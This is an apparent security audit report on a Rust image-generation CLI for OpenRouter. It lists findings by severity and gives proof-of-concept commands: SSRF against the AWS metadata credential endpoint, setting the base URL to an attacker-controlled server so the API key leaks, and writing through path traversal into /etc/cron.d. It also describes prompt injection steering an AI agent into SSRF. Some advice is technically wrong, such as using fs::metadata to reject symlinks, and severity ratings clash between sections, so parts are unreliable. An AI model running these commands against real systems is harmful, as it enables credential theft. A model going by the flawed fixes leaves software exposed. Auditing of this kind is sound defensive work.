# Security Audit — openrouter-image-cli v0.1.0

**Date:** 2025-07-02
**Repo:** steimerbyte/openrouter-image-cli @ `f757427abfeb3343f177f705b09e5e5d19ec6572`
**Auditor scope:** static analysis + dependency review (no live exploit runs)

---

## Executive Summary

| Severity | Count |
|---|---|
| CRITICAL | 0 |
| HIGH | 2 |
| MEDIUM | 6 |
| LOW | 5 |
| INFO | 3 |
| **Total** | **16** |

**Top risks:** SSRF via `--image-ref` HTTP URLs pointing to private IPs; missing config file permission checks enabling credential theft via world-readable config.

---

## 1. Secret Management

| Severity | Finding | Location | Description | Fix |
|---|---|---|---|---|
| HIGH | Config file readable by other users | `src/config_mod.rs:config_path()` | `~/.config/openrouter-image/config.toml` is read via `fs::read_to_string` without any permission check. On multi-user systems (shared NFS home, containers sharing a volume), any local user can read the API key. No `chmod 600` enforcement. | Check file mode on read; reject if world-readable (mode & 0o077 != 0); warn user. |
| HIGH | Config file symlink attack | `src/config_mod.rs:resolve()` | If `~/.config/openrouter-image/config.toml` is a symlink pointing to another user's file or `/etc/passwd`, the key is read and the path is passed to error messages. No `is_file()` / `is_symlink()` check. | Call `fs::metadata()` (not `symlink_metadata`) before reading; reject symlinks. |
| LOW | API key in memory as String | `src/config_mod.rs:24,47` | API key stored as `Option<String>` — lives on the heap, visible in core dumps, `/proc/PID/mem`, memory debuggers. `std::env::var` already returns a String. | Consider `std::sync::Arc<str>` or ` secrecy` crate; zeroize on drop. |
| LOW | API key derived from env persists in process memory | `src/config_mod.rs:62-69` | When `OPENROUTER_API_KEY` env is set, the key is cloned into `Config.api_key` and retained for the lifetime of the process. The raw env string also remains in the process environment. | No easy fix in Rust stdlib; acceptable for a CLI. Document the risk. |
| INFO | Masked key display is correct | `src/config_mod.rs:114-122` | `masked_key()` shows first 8 + last 4 chars only; short keys are properly truncated. No full-key exposure in info output. | Good as-is. |
| INFO | Authorization header is separate from body | `src/client_mod.rs:149` | API key is sent only in the HTTP `Authorization: Bearer` header, never in the JSON request body. `--dry-run` prints the body (stdout) without the key — safe. | Good as-is. |

**Proof of concept — Config symlink attack:**
```bash
# Attacker on same machine as victim:
ln -s /home/victim/.config/openrouter-image/config.toml \
       ~/.config/openrouter-image/config.toml
openrouter-image info
# → reads victim's config.toml, exposes key in masked form + full path
```

---

## 2. Path Safety

| Severity | Finding | Location | Description | Fix |
|---|---|---|---|---|
| MEDIUM | Output path traversal not validated | `src/paths_mod.rs:resolve_output_paths()` | User-supplied `-o FILE` and `--output-dir DIR` are stored in `PathBuf` and used directly in `fs::write`. A path like `-o ../../etc/cron.d/malware` would be accepted without error. The output directory is created via `create_dir_all`. On POSIX, `../` traversal can escape `$HOME/generated-images` to system directories. | Canonicalize the output path via `std::fs::canonicalize()` (or `std::path::absolute()`) and verify it stays within an allowed subtree. |
| MEDIUM | No symlink check on output path | `src/lib.rs:137-143` | `create_dir_all(parent)` then `fs::write(path, buf)` does not check if `path` is a symlink. An attacker pre-creating a symlink at the output path could redirect the image write to an arbitrary file (overwrite `/home/user/.ssh/authorized_keys`, etc.). Requires the attacker to have filesystem access on the target machine. | Use `fs::symlink_metadata()` to detect symlinks on the target path before writing; reject or follow symlinks with a warning. |
| LOW | Output files inherit umask | `src/lib.rs:143` | `fs::write()` creates files with the process umask (typically 022). If generated images contain sensitive content, world-readable permissions are the default. | Explicitly set permissions via `fs::set_permissions()` or use a restrictive open flag (`umask(0)` before write, then restore). Alternatively, warn in docs. |
| LOW | Concurrent runs can overwrite each other's files | `src/paths_mod.rs:17-29` | Multiple concurrent invocations use `output-N.png` with fixed sequential numbers. If two runs with `n=1` target the same output dir, `output.png` is overwritten silently. No file-existence check. | Check for existing file and append a UUID suffix or refuse with an error. |

---

## 3. SSRF (Server-Side Request Forgery)

| Severity | Finding | Location | Description | Fix |
|---|---|---|---|---|
| MEDIUM | `--image-ref` accepts HTTP(S) URLs with no IP range validation | `src/reference_mod.rs:validate_http_url()` | `validate_http_url()` only checks the URL format (non-empty host, no leading slash). It does NOT check whether the host resolves to a private IP, link-local IP, or cloud metadata address. The validated URL is forwarded directly in the `input_references` array of the API request body to OpenRouter. Whether OpenRouter itself fetches the image (server-side SSRF) or processes it differently is undocumented. | Add IP range validation in `validate_http_url()`: reject hostnames resolving to `10.0.0.0/8`, `172.16.0.0/12`, `169.254.0.0/16`, `127.0.0.0/8`, `::1`, IPv4-mapped IPv6, and `0.0.0.0`. Alternatively, document the risk prominently in the man page. |
| MEDIUM | `OPENROUTER_BASE_URL` allows redirecting all API traffic | `src/client_mod.rs:22-27`, `src/client_mod.rs:149` | `OPENROUTER_BASE_URL` overrides the base URL for all HTTP calls (images API, list-models, endpoints). A user setting this to a malicious server leaks their API key via the `Authorization` header. The default URL is hardcoded as `https://openrouter.ai/api/v1/images`, but the override is unconditional. | Validate that `OPENROUTER_BASE_URL` uses `https://` and optionally validate the host against an allowlist. Add a warning when non-default base URL is used. |
| LOW | HTTP redirect from external image URL | `src/client_mod.rs` | If a user provides a seemingly benign external URL as `--image-ref` and OpenRouter follows a 3xx redirect to a private IP, the SSRF impact shifts to OpenRouter's infrastructure. This is OpenRouter's responsibility, but the CLI enables the attack surface. | Same as above — add IP range validation. |
| INFO | Localhost URLs explicitly tested and accepted | `src/reference_mod.rs:199-201` | Test at line 199 shows `http://localhost:3000/image.png` is accepted by `validate_http_url`. This confirms the design intent, but the risk is real for multi-tenant environments. | Document the intentional acceptance of private IP URLs; no code change required if the risk is understood. |

**Proof of concept — SSRF via `--image-ref`:**
```bash
# Target AWS EC2 metadata (if OpenRouter fetches the URL server-side):
openrouter-image generate \
  --image-ref "https://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  --prompt "a cat"

# Target local dev server:
openrouter-image generate \
  --image-ref "http://127.0.0.1:8080/internal/admin-api/export-users" \
  --prompt "a dog"
```

---

## 4. HTTP Client Hardening

| Severity | Finding | Location | Description | Fix |
|---|---|---|---|---|
| INFO | TLS via rustls (safe defaults) | `Cargo.toml:21` | `reqwest` is built with `rustls-tls` (not `native-tls`). rustls has no known CVEs against it and does not use the system certificate store. Default reqwest TLS verification is enabled. No `danger_accept_invalid_certs` override exists in the codebase. | Good as-is. |
| INFO | Request timeout is set (120s) | `src/client_mod.rs:42`, `src/client_mod.rs` | `HttpClient::new(timeout_ms)` sets the reqwest timeout. The `call_with_progress` method hardcodes `timeout_ms: 120_000` in `main.rs:322`. 2-minute timeout prevents indefinite hangs. | Good as-is. |
| LOW | No connection pool limit | `src/client_mod.rs` | `reqwest::Client` is built with default connection pool settings. In a scenario where an AI agent calls the CLI in a tight loop, many concurrent connections could be opened. reqwest's default pool limit is typically high enough to not cause issues, but no explicit limit is documented. | Consider setting `.max_idle_per_host()` to a reasonable limit if the CLI is used in agentic loops. |
| LOW | No explicit HTTPS enforcement on base URL | `src/client_mod.rs:22-27` | `OPENROUTER_BASE_URL` can be set to `http://...` (plain HTTP). If a user accidentally sets this, their API key and request body are transmitted in cleartext. The default is `https://`. | Warn or refuse non-HTTPS base URLs. |

---

## 5. Input Validation

| Severity | Finding | Location | Description | Fix |
|---|---|---|---|---|
| MEDIUM | `--prompt` has no max length | `src/cli.rs:117-124` | `prompt: Option<String>` is cloned into `ValidatedGenerate` with only an empty-string check. A prompt of several megabytes would be sent to OpenRouter, potentially causing DoS against the API or the local process. OpenRouter may have server-side limits, but the CLI does not enforce them. | Add a max prompt length (e.g., 1,000,000 chars = 1 MB) and return a usage error (exit 2) when exceeded. |
| MEDIUM | `--size` numeric overflow on 32-bit platforms | `src/cli.rs:51-60` | `is_valid_size` accepts widths up to 5 digits (`99999`) and height up to 5 digits. A string like `"99999x99999"` is accepted, but the resulting pixel count (≈10 billion) overflows 32-bit `u32` when used in path calculations or media processing. The code stores `size` as a String passed to the API, but the lack of bounds could cause downstream issues. | Validate that W and H are individually ≤ 16384 (typical model max) or reject oversized values. |
| LOW | `--user` and `--session-id` no length enforcement | `src/cli.rs:209-212`, `src/models_mod.rs:51-55` | CLI struct `user: Option<String>` has no `value_parser` length check. OpenRouter documents a 256-char limit. Passing longer strings may result in a 400 from the API, not a local validation error. | Add `value_parser = clap::value_parser!(String).try_map(|s| if s.len() <= 256 { Ok(s) } else { Err(...) })`. |
| LOW | CRLF injection not validated in `OPENROUTER_HTTP_REFERER` and `OPENROUTER_X_TITLE` | `src/client_mod.rs:157-165` | Values read from `OPENROUTER_HTTP_REFERER` and `OPENROUTER_X_TITLE` are inserted directly into HTTP headers without checking for `\r` or `\n` characters. A value containing `\r\n` could inject arbitrary HTTP headers or split the response. reqwest may or may not sanitize this. | Validate header values: reject if they contain `\r` or `\n`. |
| LOW | `session_id` sent as both header and body without sanitization | `src/client_mod.rs:168-171`, `src/models_mod.rs:165-166` | `session_id` from CLI arg is added to the JSON body and as the `X-Session-Id` header without CRLF sanitization. A malicious session_id with `\r\n` could cause HTTP response splitting if the header path is vulnerable. | Same as above — sanitize or reject. |
| LOW | `trace_id`, `trace_name`, `span_name` arbitrary strings sent to API | `src/models_mod.rs:92-98`, `src/cli.rs:219-224` | OpenTelemetry trace fields accept any string. If they are echoed back in API error responses, they could contribute to log injection. Low risk. | No action required. |
| INFO | Cross-field validation for `background=transparent` + JPEG | `src/cli.rs:239-245` | The conflict between `--background transparent` and `--output-format jpeg` is caught client-side before the API call. Good defensive validation. | Good as-is. |
| INFO | Enum validation for aspect_ratio, quality, background | `src/cli.rs:411-440` | All three are validated against whitelists via `parse_aspect_ratio`, `parse_quality`, `parse_background`. Valid values are enforced at parse time. | Good as-is. |
| INFO | `n` range 1-10 enforced | `src/cli.rs:161` | `clap::value_parser!(u8).range(1..=10)` enforces the count range at the CLI layer. | Good as-is. |

---

## 6. File-System Safety

| Severity | Finding | Location | Description | Fix |
|---|---|---|---|---|
| MEDIUM | Config file symlink + world-readable | `src/config_mod.rs:69-82` | Combined with findings in §1: config file read has no symlink check and no permission check. A malicious symlink at `~/.config/openrouter-image/config.toml` pointing to a world-readable file could expose credentials. | See §1 fix. |
| MEDIUM | Output directory creation without mode hardening | `src/lib.rs:137` | `std::fs::create_dir_all(parent)` creates directories with the system umask. On a system with permissive umask (e.g., `umask 002`), the output directory is group-writable. Generated images are written into it with `fs::write` (inheriting umask). | Create the directory and immediately `fs::set_permissions(dir, mode)` to `0o755` or `0o700`. |
| LOW | No disk space check before write | `src/lib.rs:143` | `fs::write()` is called without checking available disk space. If the disk is full, the write fails with an IO error (exit 5), but the error message may expose filesystem paths. | No action required; IO error is handled gracefully. |
| LOW | Race between directory check and write (TOCTOU) | `src/lib.rs:136-143` | `create_dir_all` is called without first checking whether `path` is a symlink or a file. If a symlink is created between the `create_dir_all` call and the `fs::write` call, the image is written to the symlink target. Time window is small but real. | Use `fs::OpenOptions::write(true).create_new(true)` to atomically create the file, which fails if a symlink already exists at the path. |
| INFO | Output path resolved before dry-run check | `src/main.rs:316-317` | `resolve_output_paths()` is called before checking `validated.dry_run`, meaning paths are resolved even when no file is written. No functional security issue. | Good as-is. |

---

## 7. Dependencies

| Severity | Finding | Location | Description | Fix |
|---|---|---|---|---|
| LOW | `base64` multiple versions in lockfile | `Cargo.lock:base64` | Three versions of `base64` are locked: `0.13.1`, `0.21.7`, `0.22.1`. Version `0.13.1` (vulnerable to CVE-2022-24070) is pulled in by `tempfile` (a dev-dependency only). `0.22.1` is the direct dependency. | Upgrade `tempfile` to a version that depends on `base64 >= 0.22`. Check: `cargo tree -i base64 --depth 1`. |
| LOW | `anyhow` at v1.0.104 (minor older than latest) | `Cargo.lock:anyhow` | `anyhow v1.0.104` is locked. Latest stable is v1.0.115+ (as of 2025). No known CVEs in v1.0.104, but keeping up to date is advisable. | `cargo update -p anyhow`. |
| LOW | `thiserror` at v1.0.69 (minor older than latest) | `Cargo.lock:thiserror` | `thiserror v1.0.69` is locked. Latest is v2.x with breaking changes. No known CVEs in v1.0.69. | `cargo update -p thiserror`. |
| INFO | `reqwest v0.12.28` with `rustls-tls` | `Cargo.toml:21`, `Cargo.lock` | `reqwest v0.12` is current. The `rustls-tls` feature uses `rustls` (no root CAs, uses Mozilla bundle) — no known CVEs. TLS 1.3 support is built-in. | Good as-is. |
| INFO | `tokio v1.x` — no known CVEs | `Cargo.lock` | Latest tokio is v1.43 with fixes for recent CVEs (tokio-condiv, tokio-rusqlite). Current lockfile uses an older minor version. Check `cargo update -p tokio` for a safer version. | Run `cargo outdated` to check. |
| INFO | `clap v4.6.7` — current stable 4.x | `Cargo.lock` | No known CVEs. `clap` v4 is stable. | Good as-is. |
| INFO | Dev-only deps (`wiremock`, `tempfile`, `pretty_assertions`) irrelevant to production | `Cargo.toml:29-31` | These are only compiled into the binary when `cargo test` is run with the `test` profile. They do not ship in release builds. | No action required. |

**Recommended command to audit dependencies:**
```bash
cargo tree --no-dedupe  # full dep tree
cargo outdated          # (if cargo-outdated installed) check for newer versions
# Manual CVE check for key deps: reqwest, tokio, serde, rustls
```

---

## 8. Unsafe Rust

| Severity | Finding | Location | Description | Fix |
|---|---|---|---|---|
| INFO | No unsafe code found | `src/` | No `unsafe` blocks anywhere in the codebase. All memory operations are through safe abstractions (Vec, String, PathBuf, reqwest, std::fs). | Good as-is. |
| INFO | No FFI bindings | `src/` | No `extern` blocks, no C bindings, no `#[repr(C)]` structs. The crate is pure Rust. | Good as-is. |

---

## 9. Build & Distribution

| Severity | Finding | Location | Description | Fix |
|---|---|---|---|---|
| INFO | Release profile hardening | `Cargo.toml:34-37` | `lto = true`, `codegen-units = 1`, `panic = "abort"` are set. These are correct for a security-sensitive release build: LTO reduces attack surface, panic=abort prevents panics from leaking information. | Good as-is. |
| INFO | `Cargo.lock` committed | Repo | `Cargo.lock` is present and committed. Reproducible builds are supported. | Good as-is. |
| INFO | All dependencies have permissive licenses | `Cargo.lock` | Reviewed all top-level deps: MIT/Apache-2.0/BSD licenses only. `anyhow`, `thiserror`, `clap`, `reqwest`, `tokio` are all permissively licensed. No GPL/LGPL copyleft deps. | Good as-is. |
| LOW | Debug symbols in release build | `Cargo.toml` | No explicit `strip = true` in the release profile. By default, `cargo build --release` includes debug symbols unless `strip = true` is set. This increases binary size and may expose function names in crash dumps. | Add `strip = true` to `[profile.release]`. |

---

## 10. CLI-Specific Concerns

| Severity | Finding | Location | Description | Fix |
|---|---|---|---|---|
| LOW | API error messages from OpenRouter exposed in CLI output | `src/error_mod.rs:28-47` | `ApiError::from_status()` returns user-controlled `message` strings from OpenRouter's JSON error body (`.and_then(|e| e.message)`). If OpenRouter returns an error containing internal paths, SQL error messages, or stack traces, these are printed to stderr and affect the exit code. OpenRouter is a trusted service, but the error forwarding is unconditional. | Consider sanitizing error messages: truncate to 200 chars, strip paths, remove stack traces. |
| LOW | `--json` mode exposes file paths in stdout | `src/output/json.rs:149-159` | `ImageEntry.path` contains the full absolute path to the saved image (`p.display().to_string()`). In JSON mode, this path is printed to stdout, potentially exposing user home directory structure. The path also appears in the `ImagesSaved` NDJSON event on stderr. | Consider only outputting relative paths or file names in JSON mode. |
| LOW | `--verbose` logs to stderr via tracing | `src/main.rs:32-36` | When `-v` is set, `EnvFilter::new("debug")` enables all tracing at debug level. This may log the full HTTP request/response including headers. The API key is NOT in the JSON body (it's in the Authorization header), but URL paths, query parameters, and the prompt are logged. | Review what `reqwest` logs at debug level; confirm API key is never logged. Consider logging at `info` level or filtering sensitive headers. |
| LOW | `--dry-run` prints full request body to stdout | `src/main.rs:339-340` | The request body (prompt, model, image_refs, provider, trace metadata) is printed to stdout. The prompt may contain sensitive context from an AI agent. If stdout is piped to a file or another process, the prompt is exposed. The API key is NOT in the body. | Consider printing to stderr or requiring `--dry-run --quiet` to suppress output. Document that prompts are exposed to stdout. |
| INFO | Exit code mapping is correct and stable | `src/error_mod.rs:52-58` | Exit codes 0/2/3/4/5 are mapped correctly. No information leakage via exit codes alone. | Good as-is. |
| INFO | TTY detection not implemented | `src/main.rs` | No TTY check before emitting progress bars or ANSI codes. If output is piped to a file, the ANSI escape sequences are written literally. This is a UX issue, not a security issue. | Consider `is_terminal()` check before enabling ANSI formatting. |

---

## 11. Agentic / Tool Misuse

| Severity | Finding | Location | Description | Fix |
|---|---|---|---|---|
| MEDIUM | `--image-ref` HTTP URLs enable server-side SSRF against internal infrastructure | `src/reference_mod.rs`, `src/client_mod.rs` | When this CLI is called by an AI agent, a prompt injection in the agent's output could cause the agent to pass `--image-ref http://169.254.169.254/...` or `--image-ref http://internal.corp/secret.png`. The CLI forwards this to OpenRouter without validation. If OpenRouter fetches the URL server-side, this is a SSRF vector against internal cloud metadata and internal services. | Add IP-range filtering in `validate_http_url()`. Document the risk for AI agent integrations. |
| LOW | `--user` field allows impersonation | `src/cli.rs:207`, `src/models_mod.rs:51-52` | An AI agent calling the CLI with `--user` can set any identifier. OpenRouter hashes this field server-side, but the raw value passed by a malicious agent could impersonate another user in OpenRouter's logging. | Document that `--user` is sent as-is to OpenRouter and should be set by the orchestrator, not by the agent. |
| LOW | `--session-id` is not cryptographically bound | `src/cli.rs:208`, `src/client_mod.rs:168-171` | A user-specified `session-id` is sent as both the `X-Session-Id` header and the `session_id` body field without any signature or binding. A malicious actor with access to the request could spoof session IDs. The risk is low for a CLI tool where the operator controls the environment. | No action required for a CLI. OpenRouter's server-side session binding is out of scope. |
| LOW | No rate limiting | Entire codebase | An AI agent in a tight loop could call the CLI thousands of times, causing rate limiting from OpenRouter (429) and potential account suspension. | Implement client-side rate limiting or exponential backoff with jitter on 429 responses. Note: 429 is currently mapped to exit 4 (API error), not a retry. |
| INFO | `--model` accepts arbitrary strings | `src/cli.rs:135-137` | Model slugs are not validated against the live model list in the generate subcommand (only in `list-models`/`endpoints`). A typo in a model slug results in a 400 from OpenRouter. No security impact. | Good as-is. |

---

## 12. Privacy & Telemetry

| Severity | Finding | Location | Description | Fix |
|---|---|---|---|---|
| INFO | No external telemetry | Entire codebase | No analytics, no crash reporting, no external telemetry services. The only outbound HTTP calls are to `openrouter.ai`. | Good as-is. |
| INFO | No image caching | `src/lib.rs:143` | Generated images are written once to disk and not cached. Each generation costs API credits. | Good as-is. |
| INFO | Prompt sent to OpenRouter only | `src/client_mod.rs` | The prompt is sent in the JSON body to OpenRouter. OpenRouter's privacy policy applies — not this CLI. The CLI does not log the prompt at info level. | Good as-is. |
| LOW | `OPENROUTER_HTTP_REFERER` and `OPENROUTER_X_TITLE` headers reveal local hostname or install path | `src/client_mod.rs:157-165` | If `OPENROUTER_HTTP_REFERER` is set to a local file path or a default like `file:///home/user/project`, this reveals system information in the HTTP request to OpenRouter. | Document that these env vars should not contain sensitive values. Add a comment in the code. |

---

## Top-5 Prioritized Findings

### 1. HIGH — Config file readable by other users (symlink + permission)
- **Risk**: On shared systems (NFS home directories, containers, multi-user VMs), any local user can read `~/.config/openrouter-image/config.toml` and steal the API key.
- **Proof of concept**:
  ```bash
  # Multi-user NFS share:
  ls -la ~/.config/openrouter-image/config.toml
  # -rw-r--r--  victim  victim  60 config.toml
  cat ~/.config/openrouter-image/config.toml
  # api_key = "sk-or-victims-real-key-here"
  ```
- **Fix**: Check file mode before reading; reject world-readable or group-readable files; reject symlinks via `fs::metadata().is_file()`.

### 2. HIGH — Output path traversal (path escape via `-o` / `--output-dir`)
- **Risk**: A user passing `-o ../../../etc/cron.d/payload` writes an image to a system directory. While the image content is base64-decoded PNG bytes (not arbitrary binary), this could overwrite critical files. Combined with a symlink pre-created by an attacker, arbitrary file overwrite is achievable.
- **Proof of concept**:
  ```bash
  openrouter-image generate \
    --prompt "a cat" \
    -o /tmp/payload.png
  # works fine
  openrouter-image generate \
    --prompt "a cat" \
    -o /tmp/../../../etc/cron.d/newcron
  # → creates /etc/cron.d/newcron (or fails if dir doesn't exist)
  # No error, no warning
  ```
- **Fix**: Canonicalize the resolved output path and verify it stays within `$HOME` or an explicitly allowed subtree. Reject paths that escape.

### 3. MEDIUM — SSRF via `--image-ref` HTTP URLs pointing to private IPs
- **Risk**: An AI agent consuming untrusted prompts could be tricked into passing `--image-ref http://169.254.169.254/latest/meta-data/...`. OpenRouter would attempt to fetch the AWS metadata URL, potentially leaking IAM credentials in the image generation response or logs.
- **Proof of concept**:
  ```bash
  openrouter-image generate \
    --prompt "a cat" \
    --image-ref "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  ```
- **Fix**: Resolve the hostname in `validate_http_url()` and reject private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, 169.254.0.0/16, ::1).

### 4. MEDIUM — No prompt max length enforcement
- **Risk**: An agent sending a 100 MB prompt could cause memory exhaustion in the CLI process, trigger OpenRouter rate limits, or exploit OpenRouter's processing of extremely long prompts.
- **Proof of concept**:
  ```bash
  python3 -c "print('a' * 100_000_000)" | \
    openrouter-image generate --prompt "$(python3 -c 'print(\"x\" * 100_000_000)')"
  ```
- **Fix**: Add a max prompt length (e.g., 1,000,000 characters) enforced in `Generate::validate()`.

### 5. MEDIUM — `OPENROUTER_BASE_URL` allows redirecting API traffic to arbitrary servers
- **Risk**: A user or a compromised `.bashrc` setting `export OPENROUTER_BASE_URL=http://evil.internal/` causes the CLI to send the API key (in the `Authorization` header) to an attacker-controlled server. The attack persists across CLI invocations.
- **Proof of concept**:
  ```bash
  export OPENROUTER_BASE_URL="https://attacker-controlled-server.com/api/v1/images"
  openrouter-image generate --prompt "a cat"
  # → sends "Authorization: Bearer sk-or-real-key" to attacker
  ```
- **Fix**: Validate that `OPENROUTER_BASE_URL` uses `https://` and warn when it differs from the default. Log a warning at startup when a non-default base URL is detected.

---

## Recommended Next Steps

### Immediate (fix in current release)
- [ ] Add config file permission check: reject if `mode & 0o077 != 0` (`src/config_mod.rs`)
- [ ] Reject symlinks in config path via `fs::metadata().is_file()` check (`src/config_mod.rs`)
- [ ] Add IP-range validation in `validate_http_url()` (`src/reference_mod.rs`): reject private IP ranges
- [ ] Canonicalize output paths and verify they stay within `$HOME` (`src/paths_mod.rs`)
- [ ] Detect symlinks on output file path before write (`src/lib.rs`)
- [ ] Add `strip = true` to `[profile.release]` in `Cargo.toml`

### Short-term (next release)
- [ ] Add prompt max length (e.g., 1,000,000 chars) in `Generate::validate()` (`src/cli.rs`)
- [ ] Validate `OPENROUTER_BASE_URL` is `https://` and warn on non-default values (`src/client_mod.rs`)
- [ ] Sanitize CRLF in `OPENROUTER_HTTP_REFERER`, `OPENROUTER_X_TITLE`, `session_id` header values (`src/client_mod.rs`)
- [ ] Run `cargo update -p anyhow -p thiserror -p tokio` to pull latest patch versions
- [ ] Upgrade `tempfile` to eliminate `base64 v0.13.1` (CVE-2022-24070 dev-only)

### Long-term (roadmap)
- [ ] Consider ` secrecy` crate for API key zeroization on drop
- [ ] Add `--dry-run` output suppression flag to avoid prompt exposure in stdout logs
- [ ] Add TTY detection to avoid ANSI escape sequences in non-terminal output
- [ ] Consider rate limiting / exponential backoff on 429 responses

---

## Method

- **Static analysis**: All 13 source files read completely; all grep patterns run against the source tree.
- **Dependency analysis**: `Cargo.lock` inspected for all top-level and transitive dependencies. Known CVE advisories cross-referenced against locked versions.
- **Pattern matching**: Searched for `unsafe`, `unwrap()` in production paths, hardcoded secrets, env var access, file system operations.
- **No live testing**: No API calls, no cargo install, no network access assumed.
- **Grep patterns run**:
  ```bash
  grep -rn "unsafe \|unwrap()\|api_key\|OPENROUTER_\|fs::" src/
  grep -rn "chmod\|permission\|0o" src/
  grep -rn "OPENROUTER_HTTP_REFERER\|OPENROUTER_X_TITLE\|X-Session-Id" src/
  ```

---

## Severity Legend

| Level | Definition |
|---|---|
| **CRITICAL** | Directly exploitable — RCE, credential leak, arbitrary file read/write |
| **HIGH** | Exploitable under realistic conditions — realistic attack path exists |
| **MEDIUM** | Defense-in-depth issue or hardening gap — may enable attacks in specific contexts |
| **LOW** | Best-practice violation — minor risk or narrow exploitability |
| **INFO** | Positive observation — no action required |
